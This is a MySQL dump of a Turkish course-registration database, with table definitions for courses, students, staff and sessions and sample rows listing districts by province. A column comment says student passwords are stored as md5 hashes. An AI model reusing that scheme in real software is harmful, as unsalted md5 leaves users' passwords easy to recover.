-- Valentina Studio --
-- MySQL dump --
-- ---------------------------------------------------------


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
-- ---------------------------------------------------------


-- CREATE DATABASE "ob" ------------------------------------
CREATE DATABASE IF NOT EXISTS `obs` CHARACTER SET utf8 COLLATE utf8_turkish_ci;
USE `obs`;
-- ---------------------------------------------------------


-- CREATE TABLE "acilandersler" ----------------------------
CREATE TABLE `acilandersler` ( 
	`acilanderslerID` MediumInt( 6 ) UNSIGNED ZEROFILL AUTO_INCREMENT NOT NULL,
	`dersNo` Smallint( 3 ) UNSIGNED ZEROFILL NOT NULL,
	`bolumNo` Smallint( 3 ) UNSIGNED ZEROFILL NOT NULL DEFAULT '001',
	`personelNo` Char( 11 ) NULL DEFAULT '00000000000',
	`baslamaTarihi` Date NULL,
	`bitisTarihi` Date NULL,
	`gun` VarChar( 50 ) NULL,
	`saat` VarChar( 10 ) NULL,
	`kontenjan` Smallint( 3 ) NULL,
	`durum` Char( 1 ) NULL DEFAULT 'B' COMMENT 'B:Bilinmiyor A:Devam Ediyor T:Tamamlandı',
	`aciklama` VarChar( 100 ) NULL DEFAULT 'Girilmemiş',
	PRIMARY KEY ( `acilanderslerID` ),
	CONSTRAINT `acilanderslerID` UNIQUE( `acilanderslerID` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 53;
-- ---------------------------------------------------------


-- CREATE TABLE "dersprogrami" -----------------------------
CREATE TABLE `dersprogrami` ( 
	`kayitNo` BigInt( 7 ) UNSIGNED ZEROFILL AUTO_INCREMENT NOT NULL,
	`acilandersNo` MediumInt( 6 ) UNSIGNED ZEROFILL NOT NULL UNIQUE,
	`saatGun` Char( 3 ) NOT NULL UNIQUE,
	PRIMARY KEY ( `kayitNo` ),
	CONSTRAINT `acilandersNoUK` UNIQUE( `acilandersNo`, `saatGun` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 97;
-- ---------------------------------------------------------


-- CREATE TABLE "duyurular" --------------------------------
CREATE TABLE `duyurular` ( 
	`duyuruNo` Int( 7 ) UNSIGNED AUTO_INCREMENT NOT NULL,
	`personelNo` Char( 11 ) NOT NULL,
	`konu` VarChar( 50 ) NOT NULL,
	`eklemeTarihi` Date NOT NULL,
	`sonTarihi` Date NOT NULL,
	`icerik` VarChar( 10000 ) NULL,
	PRIMARY KEY ( `duyuruNo` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 6;
-- ---------------------------------------------------------


-- CREATE TABLE "ilceler" ----------------------------------
CREATE TABLE `ilceler` ( 
	`ilceKodu` Smallint( 3 ) UNSIGNED ZEROFILL AUTO_INCREMENT NOT NULL,
	`il` Char( 2 ) NOT NULL,
	`ilceAdi` VarChar( 25 ) NOT NULL,
	PRIMARY KEY ( `ilceKodu` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 941;
-- ---------------------------------------------------------


-- CREATE TABLE "iller" ------------------------------------
CREATE TABLE `iller` ( 
	`ilKodu` Char( 2 ) NOT NULL,
	`ilAdi` VarChar( 20 ) NOT NULL,
	PRIMARY KEY ( `ilKodu` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "derskatalog" ------------------------------
CREATE TABLE `derskatalog` ( 
	`dersNo` Smallint( 3 ) UNSIGNED ZEROFILL AUTO_INCREMENT NOT NULL,
	`dersAdi` VarChar( 60 ) NOT NULL,
	`dersAlani` VarChar( 40 ) NULL,
	`dersSaati` Smallint( 4 ) NULL,
	`dersIcerik` VarChar( 300 ) NULL DEFAULT 'Bilinmiyor',
	PRIMARY KEY ( `dersNo` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 46;
-- ---------------------------------------------------------


-- CREATE TABLE "bolumler" --------------------------------
CREATE TABLE `bolumler` ( 
	`bolumNo` Smallint( 3 ) UNSIGNED ZEROFILL AUTO_INCREMENT NOT NULL,
	`bolumAdi` VarChar( 50 ) NOT NULL,
	`adres` VarChar( 100 ) NULL,
	PRIMARY KEY ( `bolumNo` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 7;
-- ---------------------------------------------------------


-- CREATE TABLE "ogrencikayit" -----------------------------
CREATE TABLE `ogrencikayit` ( 
	`ogrenciKayitID` Int( 7 ) UNSIGNED AUTO_INCREMENT NOT NULL,
	`dersNo` MediumInt( 6 ) UNSIGNED ZEROFILL NOT NULL UNIQUE,
	`ogrenciNo` Char( 11 ) NOT NULL UNIQUE,
	`not1` Smallint( 3 ) NULL DEFAULT '222',
	`not2` Smallint( 3 ) NULL DEFAULT '222',
	`ortalama` Smallint( 3 ) NULL DEFAULT '222' COMMENT '111:Devamsız, 999:Girmedi',
	`sonuc` Char( 9 ) NULL COMMENT 'Başarılı, Başarısız, Devamsız',
	`devam` Smallint( 2 ) NULL,
	`kayitTarihi` Date NULL DEFAULT '0000-00-00',
	`aciklama` VarChar( 50 ) NULL DEFAULT 'Bilinmiyor',
	PRIMARY KEY ( `ogrenciKayitID`, `dersNo`, `ogrenciNo` ),
	CONSTRAINT `dersNoUQ` UNIQUE( `dersNo`, `ogrenciNo` ),
	CONSTRAINT `ogrenciKayitID` UNIQUE( `ogrenciKayitID` ) )
ENGINE = InnoDB
AUTO_INCREMENT = 366;
-- ---------------------------------------------------------


-- CREATE TABLE "ogrenciler" -------------------------------
CREATE TABLE `ogrenciler` ( 
	`ogrenciNo` Char( 11 ) NOT NULL COMMENT 'TC Kimlik No',
	`adi` VarChar( 200 ) NOT NULL,
	`soyadi` VarChar( 40 ) NOT NULL,
	`sifre` Char( 32 ) NOT NULL COMMENT 'md5 formatında saklanıyor...',
	`telefonNo` Char( 10 ) NOT NULL,
	`eposta` VarChar( 50 ) NULL DEFAULT 'Girilmemiş',
	`babaAdi` VarChar( 40 ) NULL DEFAULT 'Girilmemiş',
	`adres` VarChar( 100 ) NULL DEFAULT 'Girilmemiş',
	`dogumTarihi` Date NULL,
	`il` Char( 2 ) NULL DEFAULT '00',
	`ilce` Smallint( 3 ) UNSIGNED ZEROFILL NULL DEFAULT '940',
	`kayitTarihi` Date NULL,
	`ogrenimDurumu` TinyInt( 4 ) NULL,
	`aciklama` VarChar( 200 ) NULL DEFAULT 'Yok',
	`cinsiyet` Char( 1 ) NULL DEFAULT 'G' COMMENT 'E,K, G(Girilmemiş)',
	`zamanDilimi` TinyInt( 4 ) NULL DEFAULT '0',
	`aktif` Char( 1 ) NULL DEFAULT '1',
	PRIMARY KEY ( `ogrenciNo` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "ogrenimdurumu" ----------------------------
CREATE TABLE `ogrenimdurumu` ( 
	`ogrenimNo` TinyInt( 4 ) NOT NULL,
	`ogrenimDurumu` VarChar( 15 ) NULL DEFAULT 'Girilmemiş',
	PRIMARY KEY ( `ogrenimNo` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "oturumbilgileri" --------------------------
CREATE TABLE `oturumbilgileri` ( 
	`session_id` VarChar( 40 ) NOT NULL DEFAULT '0',
	`ip_address` VarChar( 16 ) NOT NULL DEFAULT '0',
	`user_agent` VarChar( 50 ) NOT NULL,
	`last_activity` Int( 10 ) UNSIGNED NOT NULL DEFAULT '0',
	`user_data` Text NOT NULL,
	PRIMARY KEY ( `session_id` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "personel" ---------------------------------
CREATE TABLE `personel` ( 
	`personelNo` Char( 11 ) NOT NULL COMMENT 'TC Kimlik No',
	`sicilNo` VarChar( 5 ) NOT NULL DEFAULT '0',
	`adi` VarChar( 40 ) NOT NULL,
	`soyadi` VarChar( 40 ) NOT NULL,
	`sifre` Char( 32 ) NOT NULL,
	`eposta` VarChar( 50 ) NULL DEFAULT 'Girilmemiş',
	`cinsiyet` Char( 1 ) NULL DEFAULT 'G',
	`babaAdi` VarChar( 40 ) NULL DEFAULT 'Girilmemiş',
	`grup` Char( 1 ) NOT NULL DEFAULT '1' COMMENT '1:idari 2: Egitmen 3:Yonetici',
	`adres` VarChar( 100 ) NULL DEFAULT 'Girilmemiş',
	`il` Char( 2 ) NULL DEFAULT '00',
	`ilce` Smallint( 3 ) UNSIGNED ZEROFILL NULL DEFAULT '940',
	`dogumTarihi` Date NULL,
	`kayitTarihi` Date NULL,
	`aciklama` VarChar( 400 ) NULL DEFAULT 'Girilmemiş',
	PRIMARY KEY ( `personelNo` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "uygunzamandilimi" -------------------------
CREATE TABLE `uygunzamandilimi` ( 
	`zamanDilimiNo` TinyInt( 4 ) NOT NULL,
	`zamanDilimi` VarChar( 25 ) NOT NULL,
	PRIMARY KEY ( `zamanDilimiNo` ) )
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- CREATE TABLE "vs_database_diagrams" ---------------------
CREATE TABLE `vs_database_diagrams` ( 
	`name` Char( 80 ) NULL,
	`diadata` Text NULL,
	`comment` VarChar( 1022 ) NULL,
	`preview` Text NULL,
	`lockinfo` Char( 80 ) NULL,
	`locktime` Timestamp NOT NULL ON UPDATE CURRENT_TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
	`version` Char( 80 ) NULL )
CHARACTER SET = latin1
COLLATE = latin1_swedish_ci
ENGINE = InnoDB;
-- ---------------------------------------------------------


-- Dump data of "acilandersler" ----------------------------
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000001', '001', '001', '00000000001', '2011-05-24', '2011-06-24', NULL, NULL, '10', 'T', '' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000036', '034', '002', '00000000001', '2011-05-11', '2011-06-18', '0', '0', '12', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000037', '035', '002', '00000000001', '2011-05-24', '2011-05-24', NULL, NULL, '12', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000038', '033', '006', '00000000001', '2011-05-19', '2011-06-20', NULL, NULL, '13', 'A', '' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000039', '033', '004', '00000000001', '2011-07-11', '2011-07-12', '0', '0', '14', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000041', '001', '003', '00000000001', '2011-08-18', '2011-10-30', 'Pazartesi,Salı,Çarşamba', '09:00', '45', 'T', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000042', '034', '003', '00000000001', '2011-08-25', '2011-09-25', 'Cumartesi, Pazar', '18:00-20:0', '15', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000044', '034', '003', '00000000001', '2011-08-02', '2011-09-22', '', '', '14', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000045', '034', '006', '00000000001', '2011-08-02', '2011-09-22', '', '', '16', 'T', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000046', '001', '004', '00000000001', '2011-08-02', '2011-09-21', '0', '0', '18', 'T', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000047', '033', '001', '00000000001', '0000-00-00', '0000-00-00', '', '', '19', 'T', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000048', '035', '006', '11111111111', '2011-09-08', '2011-10-08', NULL, NULL, '20', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000050', '036', '004', '11111111111', '2011-09-12', '2011-10-12', NULL, NULL, '10', 'A', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000051', '036', '006', '11111111111', '2011-09-30', '2011-10-20', '0', '0', '10', 'T', 'Bilinmiyor' );
INSERT INTO `acilandersler`(`acilanderslerID`,`dersNo`,`bolumNo`,`personelNo`,`baslamaTarihi`,`bitisTarihi`,`gun`,`saat`,`kontenjan`,`durum`,`aciklama`) VALUES ( '000052', '045', '004', '00000000001', '2011-09-30', '2011-11-30', NULL, NULL, '40', 'A', 'Bilinmiyorrr' );
-- ---------------------------------------------------------


-- Dump data of "dersprogrami" -----------------------------
INSERT INTO `dersprogrami`(`kayitNo`,`acilandersNo`,`saatGun`) VALUES ( '0000057', '000037', '22' );

INSERT INTO `dersprogrami`(`kayitNo`,`acilandersNo`,`saatGun`) VALUES ( '0000085', '000041', '52' );



-- Dump data of "duyurular" --------------------------------
INSERT INTO `duyurular`(`duyuruNo`,`personelNo`,`konu`,`eklemeTarihi`,`sonTarihi`,`icerik`) VALUES ( '2', '00000000001', 'dersu kayıtları başlamıştır...', '2011-01-01', '2011-01-01', '2011-01-01' );
INSERT INTO `duyurular`(`duyuruNo`,`personelNo`,`konu`,`eklemeTarihi`,`sonTarihi`,`icerik`) VALUES ( '3', '00000000001', ' dersu kayıtları başlamıştır...', '2011-02-02', '2011-02-02', '2011-2-2' );
INSERT INTO `duyurular`(`duyuruNo`,`personelNo`,`konu`,`eklemeTarihi`,`sonTarihi`,`icerik`) VALUES ( '4', '00000000002', 'Bilgisayar İşletmenlik dersu açılıyor', '2011-02-02', '2011-02-02', '' );
INSERT INTO `duyurular`(`duyuruNo`,`personelNo`,`konu`,`eklemeTarihi`,`sonTarihi`,`icerik`) VALUES ( '5', '00000000002', 'duyuru1', '2011-06-27', '2011-06-30', ' dfgasdfg' );
-- ---------------------------------------------------------


-- Dump data of "ilceler" ----------------------------------
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '001', '01', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '002', '01', 'Aladag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '003', '01', 'Ceyhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '004', '01', 'Feke' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '005', '01', 'Imamoglu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '006', '01', 'Karaisali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '007', '01', 'Karatas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '008', '01', 'Kozan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '009', '01', 'Pozanti' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '010', '01', 'Saimbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '011', '01', 'Seyhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '012', '01', 'Tufanbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '013', '01', 'Yumurtalik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '014', '01', 'Yüregir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '015', '02', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '016', '02', 'Besni' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '017', '02', 'Çelikhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '018', '02', 'Gerger' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '019', '02', 'Gölbasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '020', '02', 'Kahta' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '021', '02', 'Samsat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '022', '02', 'Sincik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '023', '02', 'Tut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '024', '03', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '025', '03', 'Basmakçi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '026', '03', 'Bayat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '027', '03', 'Bolvadin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '028', '03', 'Çobanlar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '029', '03', 'Çay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '030', '03', 'Dazkiri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '031', '03', 'Dinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '032', '03', 'Emirdag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '033', '03', 'Evciler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '034', '03', 'Hocalar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '035', '03', 'Ihsaniye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '036', '03', 'Iscehisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '037', '03', 'Kizilören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '038', '03', 'Sandikli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '039', '03', 'Sincanli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '040', '03', 'Sultandagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '041', '03', 'Suhut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '042', '04', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '043', '04', 'Diyadin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '044', '04', 'Dogubeyazit' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '045', '04', 'Eleskirt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '046', '04', 'Hamur' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '047', '04', 'Patnos' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '048', '04', 'Tasliçay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '049', '04', 'Tutak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '050', '05', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '051', '05', 'Göynücek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '052', '05', 'Gümüshacikö' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '053', '05', 'Hamamözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '054', '05', 'Merzifon' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '055', '05', 'Suluova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '056', '05', 'Tasova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '057', '06', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '058', '06', 'Akyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '059', '06', 'Altindag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '060', '06', 'Ayas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '061', '06', 'Bala' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '062', '06', 'Beypazari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '063', '06', 'Çamlidere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '064', '06', 'Çankaya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '065', '06', 'Çubuk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '066', '06', 'Elmadag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '067', '06', 'Etimesgut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '068', '06', 'Evren' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '069', '06', 'Gölbasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '070', '06', 'Güdül' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '071', '06', 'Haymana' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '072', '06', 'Kalecik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '073', '06', 'Kazan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '074', '06', 'Keçiören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '075', '06', 'Kizilcahama' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '076', '06', 'Mamak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '077', '06', 'Nallihan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '078', '06', 'Polatli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '079', '06', 'Sincan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '080', '06', 'Sereflikoçh' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '081', '06', 'Yenimahalle' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '082', '07', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '083', '07', 'Akseki' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '084', '07', 'Alanya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '085', '07', 'Demre' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '086', '07', 'Elmali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '087', '07', 'Finike' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '088', '07', 'Gazipasa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '089', '07', 'Gündogmus' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '090', '07', 'Ibradi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '091', '07', 'Kale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '092', '07', 'Kas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '093', '07', 'Kemer' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '094', '07', 'Korkuteli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '095', '07', 'Kumluca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '096', '07', 'Manavgat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '097', '07', 'Serik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '098', '08', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '099', '08', 'Ardanuç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '100', '08', 'Arhavi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '101', '08', 'Borçka' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '102', '08', 'Hopa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '103', '08', 'Murgul' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '104', '08', 'Savsat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '105', '08', 'Yusufeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '106', '09', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '107', '09', 'Bozdogan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '108', '09', 'Buharkent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '109', '09', 'Çine' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '110', '09', 'Germencik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '111', '09', 'Incirliova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '112', '09', 'Karacasu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '113', '09', 'Karpuzlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '114', '09', 'Koçarli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '115', '09', 'Kösk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '116', '09', 'Kusadasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '117', '09', 'Kuyucak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '118', '09', 'Nazilli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '119', '09', 'Söke' );
